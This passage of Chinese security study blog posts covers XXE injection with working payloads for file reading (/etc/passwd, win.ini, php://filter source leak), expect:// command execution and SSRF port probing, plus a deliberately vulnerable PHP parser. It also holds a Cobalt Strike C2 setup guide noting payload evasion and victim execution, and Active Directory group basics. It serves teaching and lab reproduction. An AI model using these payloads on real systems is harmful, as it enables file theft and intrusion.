class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></li><li><p>外部文档声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="内部声明的例子"><a href="#内部声明的例子" class="headerlink" title="内部声明的例子"></a>内部声明的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><h4 id="最外部引用的例子"><a href="#最外部引用的例子" class="headerlink" title="最外部引用的例子"></a>最外部引用的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;waibu.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><p>waibu.DTD 被引用的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>XXE 即 XML外部实体注入 。</p><p>我们先分别理解一下注入和外部实体的含义。</p><ul><li>注入：是指<code>XML</code>数据在传输过程中被修改，导致服务器执行了修改后的恶意代码，从而达到攻击目的。</li><li>外部实体：则是指攻击者通过利用外部实体声明部分来对<code>XML</code>数据进行修改、插入恶意代码。</li></ul><p>所以<code>XXE</code>就是指<code>XML</code>数据在传输过程中利用外部实体声明部分的<code>“SYSTEM”</code>关键词导致<code>XML</code>解析器可以从本地文件或者远程<code>URI</code>中读取受保护的数据。</p><h2 id="主流的漏洞payload"><a href="#主流的漏洞payload" class="headerlink" title="主流的漏洞payload"></a>主流的漏洞payload</h2><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">fff</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;fff;</span><span class="tag">&lt;/<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这种情况很少发生，但在配置不当/开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://id"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SSRF内网探测"><a href="#SSRF内网探测" class="headerlink" title="SSRF内网探测"></a>SSRF内网探测</h4><p>我们要根据返回信息内容判断该端口是否打开。</p><p>主要是根据报错信息的差异来判断是否生效</p><p>若测试端口返回“Connection refused”则可以知道该端口是关闭的，否则为就是打开的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">ssrf</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.246.136:80"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;ssrf;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>ssrf?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="简单的测试代码"><a href="#简单的测试代码" class="headerlink" title="简单的测试代码"></a>简单的测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">  $xml = simplexml_load_string($data,<span class="string">"SimpleXMLElement"</span>,LIBXML_NOENT);</span><br><span class="line">  var_dump($xml)</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：自己写个html提交表单把，我的环境是 win7+phpstudy</p><h3 id="任意文件读取payload"><a href="#任意文件读取payload" class="headerlink" title="任意文件读取payload"></a>任意文件读取payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"file:///C:/Windows/win.ini"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308114723119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="任意文件读取php文件payload"><a href="#任意文件读取php文件payload" class="headerlink" title="任意文件读取php文件payload"></a>任意文件读取php文件payload</h3><p>问题出在读代码地方，都有&lt;&gt;这种可能会把php文件当初xml给处理了，所以直接读取会直接报错。所以我们换一种协议，转化格式读取<br>最终可以导致源码泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308115546147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解码后正确<br><img src="https://img-blog.csdnimg.cn/20200308115659474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="SSRF内网探测payload"><a href="#SSRF内网探测payload" class="headerlink" title="SSRF内网探测payload"></a>SSRF内网探测payload</h3><p>这个报错信息根据环境的不同，协议的不同报错方式都不一样，所以到底这个有没有打开得自行遍历查看异同，和报错信息判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"http://127.0.0.1:3306"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p>使用开发语言提供的禁用外部实体的方法</p><p>PHP：</p><p>libxml_disable_entity_loader(true);</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-神器-Cobalt Strike-一-CS的基础和介绍</title>
      <link href="/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%B8%80-CS%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%B8%80-CS%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-工具-Cobalt-Strike-CS-基础"><a href="#内网安全学习从入门到入狱-工具-Cobalt-Strike-CS-基础" class="headerlink" title="内网安全学习从入门到入狱-工具-Cobalt Strike(CS)基础"></a>内网安全学习从入门到入狱-工具-Cobalt Strike(CS)基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li><p>本文主要是看了 Cobalt Strike 各种资料后记的笔记。</p></li><li><p>参考过于杂乱，如有问题请联系我</p></li><li><p>手上虽然没有4.0 ，但是也要提前学习了</p></li></ul><h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>官网收费软件 <a href="https://www.cobaltstrike.com/，Cobalt" target="_blank" rel="noopener">https://www.cobaltstrike.com/，Cobalt</a> Strike许可费用为每位用户3500美元，其他的不说了</p><ul><li><p>Cobalt Strike是用于“对手模拟”和“红队行动”的软件</p></li><li><p>C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透</p></li><li><p>个人感觉是内网利器，所以放到内网里面了</p></li><li><p>Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。</p></li><li><p>Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200306102229806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="基本名词解释"><a href="#基本名词解释" class="headerlink" title="基本名词解释"></a>基本名词解释</h2><h3 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h3><p>C2 就是 Command &amp; Control Server 的简称，也就是命令与控制服务器。</p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>攻击者在C2上运行的服务，可以监听Beacon的请求(check in)。</p><h3 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h3><p>Beacon 是 Cobalt Strike 的 Payload</p><p>植入到受感染系统中的恶意程序，可以请求C2服务器并在受感染系统中执行命令</p><ul><li><p>有两种通信策略（与团队服务器，CS 中以团队服务器作为 C2）</p></li><li><ul><li>异步式通信 = 频率低、速度慢</li><li>交互式通信 = C2 对 Beacon 实时控制</li></ul></li><li><p>使用 HTTP/S 或 DNS 来出口网络数据</p></li></ul><h3 id="agent"><a href="#agent" class="headerlink" title="agent"></a>agent</h3><p>agent<code>的本意为代理。当攻击者通过代码执行，有一个</code>agent<code>运行在目标网络中，就可以对目标网络进行命令与控制。所以</code>agent` 实际上相当于 Beacon payload。</p><h3 id="服务器-Team-Server"><a href="#服务器-Team-Server" class="headerlink" title="服务器(Team Server)"></a>服务器(Team Server)</h3><p>Cobalt Strike的服务器组件。Team Server(TS)是配置和启动Listener的地方</p><ul><li>控制 - Team Server是Cobalt Strike中所有payload的主控制器，与受害者的所有连接<code>bind/reverse</code>都由Team Server管理。</li></ul><h3 id="客户端-Client-GUI"><a href="#客户端-Client-GUI" class="headerlink" title="客户端(Client GUI)"></a>客户端(Client GUI)</h3><p>团队成员使用的图形化界面</p><hr><h2 id="搭建基本的流程"><a href="#搭建基本的流程" class="headerlink" title="搭建基本的流程"></a>搭建基本的流程</h2><ol><li>(可选步骤)选取C2域名</li><li>(可选步骤)扩展Team Server - 选取或自定义一个C2通信配置文件<a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable C2 profile</a> 可设置有效的SSL证书等</li><li>(可选步骤)扩展Client功能 - 使用<a href="https://github.com/search?q=Aggressor+Script" target="_blank" rel="noopener">AggressorScripts</a>修改或扩展Cobalt Strike 3.* 的客户端功能</li><li>启动团队服务器Team Server</li><li>Client 登录Team Server</li><li>启动监听器Listener</li><li>生成payload</li><li>(可选步骤)对payload进行免杀 尽量避免杀毒软件报毒</li><li>使用任意途径以实现受害者主机执行payload</li><li>对victim主机所在网络进行后渗透操作</li></ol><p>注：2这个后续可能另外写</p><p>C2通信配置文件 - <a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable C2 profile</a></p><ul><li>定义C2的通信格式，修改CS默认的流量特征，以对抗流量分析</li><li>使用前强烈推荐使用团队服务器上的脚本对配置文件进行本地的单元测试以检查语法<code>./c2lint my.profile</code></li><li>每个Cobalt Strike团队服务器只能加载一个配置文件，如果需要多个配置文件，可以启动多个团队服务器，每个都有自己的配置文件，可从同一个Cobalt Strike客户端连接到这些服务器</li></ul><h2 id="简单的使用"><a href="#简单的使用" class="headerlink" title="简单的使用"></a>简单的使用</h2><h3 id="先启动team-sever"><a href="#先启动team-sever" class="headerlink" title="先启动team sever"></a>先启动team sever</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启动Team Server</span><br><span class="line"> # team server 必须以 root 权限运行 以便于监听端口号为0–1023的listener</span><br><span class="line"> # 默认使用50050端口 监听来自团队成员CS Client的连接请求</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如 sudo .&#x2F;teamserver 192.168.0.100 123456</span><br><span class="line">## 注意要给可以执行权限</span><br><span class="line">## chmod 777 teamserver</span><br></pre></td></tr></table></figure><p><img src="/Users/zy/Library/Application%20Support/typora-user-images/image-20200304184201215.png" alt="image-20200304184201215"></p><h5 id="启动参数"><a href="#启动参数" class="headerlink" title="启动参数"></a>启动参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver &lt;host&gt; &lt;password&gt; [&#x2F;path&#x2F;to&#x2F;c2.profile] [YYYY-MM-DD]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 1 - 必填参数&#96;host&#96; 本服务器外网IP&#x2F;域名</span><br><span class="line">- 2 - 必填参数&#96;password&#96; Client GUI连接时需要输入的密码</span><br><span class="line">- 3 - 可选参数&#96;Malleable C2 communication profile&#96; 指定C2通信配置文件 该功能体现了CS的强大扩展性</span><br><span class="line">- 4 - 可选参数&#96;kill date&#96; 指定所有payload的终止日期</span><br></pre></td></tr></table></figure><h3 id="启动Client客户端"><a href="#启动Client客户端" class="headerlink" title="启动Client客户端"></a>启动Client客户端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;Cobalt Strike</span><br><span class="line"></span><br><span class="line">## 注意要给可以执行权限</span><br><span class="line">## chmod 777 teamserver</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200306102329521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="Client-GUI-图形界面"><a href="#Client-GUI-图形界面" class="headerlink" title="Client GUI 图形界面"></a>Client GUI 图形界面</h3><p>登陆成功</p><p><img src="https://img-blog.csdnimg.cn/20200306102346823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网基础知识</title>
      <link href="/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-知识-内网基础知识"><a href="#内网安全学习从入门到入狱-知识-内网基础知识" class="headerlink" title="内网安全学习从入门到入狱-知识-内网基础知识"></a>内网安全学习从入门到入狱-知识-内网基础知识</h1><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><a href="#_0">内网安全学习从入门到入狱-知识-内网基础知识</a></li><li><ul><li><a href="#_3">内网渗透基础</a></li><li><ul><li><a href="#_10">基本的名词介绍</a></li><li><ul><li><a href="#_12">工作组</a></li><li><a href="#_20">域</a></li><li><a href="#AD_32">活动目录（AD）</a></li><li><a href="#DC_DC_51">DC 域控制器（DC）</a></li><li><a href="#DNS_63">DNS域名服务器</a></li></ul></li><li><a href="#_73">安全域的划分</a></li><li><ul><li><a href="#DMZ_75">DMZ是什么？</a></li><li><a href="#_94">域中有哪些电脑？</a></li></ul></li><li><a href="#_106">域内的权限分类</a></li><li><ul><li><a href="#_108">域本地组</a></li><li><a href="#_114">全局组</a></li><li><a href="#_122">通用组</a></li></ul></li><li><a href="#AGDLP__134">A-G-DL-P 策略</a></li><li><a href="#_153">常用本地域组的权限</a></li></ul></li></ul></li></ul><h2 id="内网渗透基础"><a href="#内网渗透基础" class="headerlink" title="内网渗透基础"></a>内网渗透基础</h2><ul><li>首先本文章基本上学习笔记</li><li></li></ul><hr><h3 id="基本的名词介绍"><a href="#基本的名词介绍" class="headerlink" title="基本的名词介绍"></a>基本的名词介绍</h3><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><ul><li>工作组(Work Group)是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</li><li>工作组简单来说就是计算机在一个局域网中的的一个圈子，这个圈子大家都是平等的，想来就来想走就走，基本上没有什么约束，自我感觉就是一个组织的名称而已没有什么管理功能。</li></ul><hr><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><ul><li><p>域是一个有安全边界的计算机集合,在同一个域中的计算机, _计算机域_彼此之间已经建立了信任关系,在域内访问其他机器,不再需要被访问机器的许可。</p></li><li><p>和工作组比较，相当于加入了管理功能，有一些身份验证的功能，更加智能和安全</p></li></ul><hr><h4 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h4><ul><li>活动目录（Active Directory，AD）是指域环境中提供目录服务的组件</li><li>活动目录主要提供以下功能。<br> 账号集中管理：所有账号均存储在服务器上，以便对账号进行重置命令/重置密码等。<br> 软件集中管理：统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让<br>用户自由选择要安装的软件。<br> 环境集中管理：统一客户端桌面、IE、TCP/IP 协议等的设置。<br> 增强安全性：统一部署杀毒软件和扫毒任务、集中管理用户的计算机权限、统一制订用户<br>密码策略等。可以监控网络，对资料进行统一管理。<br> 更可靠，更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡<br>等技术对文件服务器进行容灾设定。更可靠，宕机时间更短。</li></ul><hr><h4 id="DC-域控制器（DC）"><a href="#DC-域控制器（DC）" class="headerlink" title="DC 域控制器（DC）"></a>DC 域控制器（DC）</h4><ul><li><p>域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录（AD）的计算机称为域控制器。在第一次安装活动目录时,安装活动目录的那台计算机就成为域控制器,简称“域控”</p></li><li><p>是一个域中的一台类似管理员一台机子，域控制器负责每一台联入的计算机和用户的验证工作，可以控制域中的计算机，鉴别是不是我们域中的机子。</p></li></ul><hr><h4 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h4><ul><li><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区</p></li><li><p>一般情况下DC和DNS是一个服务器</p></li></ul><hr><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><h4 id="DMZ是什么？"><a href="#DMZ是什么？" class="headerlink" title="DMZ是什么？"></a>DMZ是什么？</h4><p>英文全名“Demilitarized Zone”，中文含义是“隔离区”。在安全领域的具体含义是“内外网防火墙之间的区域”。</p><p>俗称非军事化区</p><p>最主要的知识点，访问控制的情况：</p><ol><li>内网可以访问外网：内网用户访问外网，内网的人也是要上网办公的。</li><li>内网可以访问 DMZ：也得管理自己的网站邮箱服务器</li><li>外网不能访问内网</li><li>外网可以访问DMZ：DMZ中的服务器需要为外界提供服务</li><li>DMZ 不能访问内网</li><li>DMZ 不能访问外网，这个也是不一定，有些服务也是需要访问的，所以这个看情况</li></ol><hr><h4 id="域中有哪些电脑？"><a href="#域中有哪些电脑？" class="headerlink" title="域中有哪些电脑？"></a>域中有哪些电脑？</h4><p>域控制器：DC一般是一个或者两个</p><p>成员服务器：域控底下没有按照AD的普通电脑</p><p>客户机：有一些办公的电脑，例如运维的电脑</p><p>独立的服务器：在一个网里面，但是没加入域环境</p><hr><h3 id="域内的权限分类"><a href="#域内的权限分类" class="headerlink" title="域内的权限分类"></a>域内的权限分类</h3><h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>单个域里面自己指派屋多个域来访问，就是把我自己本域的资源授权别人，但是只能在本地使用，只有自己是特权</p><p>全林 干 我</p><h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>Donain Admin是最大全局组</p><p>单域用户访问多域资源（必须是同一个域里面的用户），我就是域管理员。</p><p>本域 干 全林</p><h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>通用组成员来自域森林中任何域的用户</p><p>账户非常适于域森林中的跨域访问</p><p>全林 干 全林</p><hr><h3 id="A-G-DL-P-策略"><a href="#A-G-DL-P-策略" class="headerlink" title="A-G-DL-P 策略"></a>A-G-DL-P 策略</h3><p>常用的策略形式</p><ul><li>A（Account）表示用户账号。</li><li>G（Global Group）表示全局组。</li><li>U（Universal Group）表示通用组。</li><li>DL（Domain Local Group）表示域本地组。</li><li>P（Permission，许可）表示资源权限。</li><li>按照 A-G-DL-P 策略对用户进行组织和管理会更容易</li><li>A-G-DL-P 策略是指，将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本<br>地组分配资源权限。</li></ul><hr><h3 id="常用本地域组的权限"><a href="#常用本地域组的权限" class="headerlink" title="常用本地域组的权限"></a>常用本地域组的权限</h3><p><strong>管理员组（Administrators）的成员可以完全不受限制地存取计算机/域的资源，最强组吧。</strong></p><p>备份操作员组（Backup Operators）的成员可以在域控制器上执行备份和还原操作，并可以<br>在本地登录和关闭域控制器。</p><p>远程登录组（Remote Desktop Users）的成员被授予远程登录的权限</p><p><strong>域管理员组（Domain Admins）的成员在所有加入域的服务器和工作站、域控制器和活动目</strong><br><strong>录上均默认拥有完整的管理员权限。 我们俗称的域管理员。</strong></p><p><strong>企业系统管理员组（Enterprise Admins）是域森林根域中的一个组。该组在域森林中的每个</strong><br><strong>域内都是 Administrators 